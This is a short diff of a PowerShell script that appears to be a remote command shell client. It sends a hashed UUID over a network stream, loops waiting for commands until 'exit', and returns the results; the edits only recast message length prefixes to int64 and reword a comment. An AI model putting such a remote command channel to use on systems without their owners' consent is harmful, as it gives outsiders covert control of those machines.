@@ -9,7 +9,7 @@ try {
 $hasher = [System.Security.Cryptography.HashAlgorithm]::Create("sha256");
 $uuid = $hasher.ComputeHash($uuid);
 
-# Preallocate byte array with zeroes? Max command length 65535 bytes?
+# Preallocate byte array of sensible size with zeroes.
 [byte[]] $bytes = 0..65535 | % {0};
 
 # Loop indefinitely until "exit" command is issued.
@@ -29,7 +29,7 @@ while (1) {
 
     # Send UUID as initial message.
     $out = $uuid
-    $out = [System.BitConverter]::GetBytes($out.Length) + $out
+    $out = [System.BitConverter]::GetBytes([int64] $out.Length) + $out
     $stream.Write($out, 0, $out.Length);
     $stream.Flush();
 
@@ -56,7 +56,7 @@ while (1) {
 
         # Send response.
         $out = [System.Text.Encoding]::UTF8.GetBytes($result);
-        $out = [System.BitConverter]::GetBytes($out.Length) + $out
+        $out = [System.BitConverter]::GetBytes([int64] $out.Length) + $out
         $stream.Write($out, 0, $out.Length);
         $stream.Flush();
     }
